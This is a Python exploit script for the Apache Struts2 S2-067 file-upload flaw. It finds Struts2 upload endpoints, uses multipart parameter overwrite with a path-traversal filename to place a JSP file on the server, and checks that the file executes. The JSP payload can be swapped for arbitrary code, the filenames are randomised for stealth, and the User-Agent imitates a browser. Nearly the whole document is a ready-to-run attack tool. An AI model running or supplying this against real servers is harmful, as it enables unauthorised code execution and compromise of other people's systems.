import requests
import argparse
import random
import string
from urllib.parse import urljoin

def generate_random_filename(extension=".jsp"):
    """
    Generate a random filename for stealthy payload uploads.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension

def upload_exploit(target_url, upload_endpoint, payload_filename, malicious_filename, payload_content):
    """
    Exploit Apache Struts2 S2-067 to upload a malicious payload using parameter overwrite.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading exploit to {upload_url}...")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close"
    }

    # Multi-part form-data with overwrite parameter
    files = {
        "Upload": (payload_filename, payload_content, "application/octet-stream")
    }
    data = {
        "uploadFileName": f"../{malicious_filename}"
    }

    try:
        response = requests.post(upload_url, headers=headers, files=files, data=data, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] File '{malicious_filename}' uploaded successfully.")
            verify_payload(target_url, malicious_filename)
        elif response.status_code in [403, 401]:
            print(f"[WARNING] Upload blocked. HTTP Status: {response.status_code}. Possible WAF or permissions issue.")
        else:
            print(f"[ERROR] Upload failed. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Exploit failed: {e}")

def verify_payload(target_url, malicious_filename):
    """
    Verify if the malicious payload was successfully uploaded and is executable.
    """
    payload_url = urljoin(target_url, malicious_filename)
    print(f"[INFO] Verifying payload at: {payload_url}...")

    try:
        response = requests.get(payload_url, timeout=10)
        if response.status_code == 200 and "Exploit test successful!" in response.text:
            print(f"[ALERT] Exploit successful! Payload executed at: {payload_url}")
        elif response.status_code == 404:
            print(f"[INFO] File not found. Possible server-side restriction.")
        else:
            print(f"[INFO] Unexpected response. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response Content: {response.text[:200]}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")

def discover_upload_endpoint(target_url):
    """
    Attempt to discover common upload endpoints for Apache Struts2.
    """
    print("[INFO] Attempting to discover common upload endpoints...")
    common_endpoints = [
        "/upload.action",
        "/fileUpload.action",
        "/uploadFile.action",
        "/struts2-showcase/fileUpload.action",
    ]

    for endpoint in common_endpoints:
        test_url = urljoin(target_url, endpoint)
        try:
            response = requests.options(test_url, timeout=5)
            if response.status_code in [200, 403]:
                print(f"[INFO] Potential upload endpoint discovered: {endpoint}")
                return endpoint
        except requests.exceptions.RequestException:
            continue
    print("[WARNING] No common upload endpoints discovered.")
    return None

def main():
    parser = argparse.ArgumentParser(description="Apache Struts2 S2-067 Exploit Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", help="Path to file upload endpoint (e.g., /upload.action)")
    parser.add_argument("--payload_filename", default="test.txt", help="Legitimate filename for upload")
    parser.add_argument("--malicious_filename", default="exploit.jsp", help="Path-traversed filename for malicious payload (e.g., ../exploit.jsp)")
    parser.add_argument("--payload", default="<% out.println('Exploit test successful!'); %>", help="Custom payload content for JSP")
    args = parser.parse_args()

    print("[INFO] Starting Apache Struts2 S2-067 Exploit...")
    target_url = args.url.rstrip("/")
    payload_filename = args.payload_filename
    malicious_filename = args.malicious_filename
    payload_content = args.payload

    # Discover endpoint if not provided
    upload_endpoint = args.upload_endpoint
    if not upload_endpoint:
        upload_endpoint = discover_upload_endpoint(target_url)
        if not upload_endpoint:
            print("[ERROR] No valid upload endpoints discovered. Exiting.")
            return

    # Execute exploit
    upload_exploit(target_url, upload_endpoint, payload_filename, malicious_filename, payload_content)
    print("[INFO] Exploit process completed.")

if __name__ == "__main__":
    main()
